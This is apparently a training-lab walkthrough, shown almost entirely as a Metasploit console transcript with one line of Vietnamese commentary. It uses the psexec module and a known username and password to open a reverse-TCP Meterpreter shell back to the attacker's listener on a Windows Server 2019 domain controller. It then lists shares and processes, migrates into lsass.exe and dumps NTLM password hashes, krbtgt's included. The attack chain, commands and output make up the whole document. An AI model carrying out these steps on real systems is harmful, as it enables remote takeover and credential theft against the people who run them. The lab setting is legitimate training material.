```
msfconsole
```

```
msf > search exploit/windows/smb/psexec

Matching Modules
================

   #  Name                        Disclosure Date  Rank    Check  Description
   -  ----                        ---------------  ----    -----  -----------
   0  exploit/windows/smb/psexec  1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution
   1    \_ target: Automatic      .                .       .      .
   2    \_ target: PowerShell     .                .       .      .
   3    \_ target: Native upload  .                .       .      .
   4    \_ target: MOF upload     .                .       .      .
   5    \_ target: Command        .                .       .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/psexec
After interacting with a module you can manually set a TARGET with set TARGET 'Command'
```
```
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```
```
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) o
                                                    r a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.217.130  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
```
msf exploit(windows/smb/psexec) > set rhosts 10.48.180.77
rhosts => 10.48.180.77
```
```
msf exploit(windows/smb/psexec) > set lhost 192.168.175.163
lhost => 192.168.175.163
```
```
msf exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen
```
```
msf exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
```
```
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.175.163:4444 
[*] 10.48.180.77:445 - Connecting to the server...
[*] 10.48.180.77:445 - Authenticating to 10.48.180.77:445 as user 'ballen'...
[*] 10.48.180.77:445 - Selecting PowerShell target
[*] 10.48.180.77:445 - Executing the payload...
[+] 10.48.180.77:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.48.180.77
[*] Meterpreter session 1 opened (192.168.175.163:4444 -> 10.48.180.77:50765) at 2026-07-15 04:58:31 -0400
```
```
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 8
Meterpreter     : x86/windows
```
```
meterpreter > shell
Process 3440 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.
```
```
C:\Windows\system32>net share
net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
NETLOGON     C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
                                             Logon server share                
speedster    C:\Shares\speedster             
SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
The command completed successfully.
```

```
C:\Windows\system32>exit
exit
```

```
meterpreter > ps

Process List
============

 PID   PPID  Name                 Arch  Session  User                          Path
 ---   ----  ----                 ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System               x64   0
 68    4     Registry             x64   0
 396   4     smss.exe             x64   0
 480   744   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 492   708   dwm.exe              x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 500   744   svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 548   536   csrss.exe            x64   0
 616   536   wininit.exe          x64   0
 628   608   csrss.exe            x64   1
 708   608   winlogon.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 744   616   services.exe         x64   0
 760   616   lsass.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 780   964   conhost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 884   744   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 892   744   svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 952   744   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 964   784   powershell.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell
                                                                               \v1.0\powershell.exe
```
Chon `760   616   lsass.exe`

```
meterpreter > migrate 760
[*] Migrating from 1824 to 760...
[*] Migration completed successfully.
```

```
meterpreter > hahdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:3ed6bd43dee8715e7f7b34043a856a0f:::
```


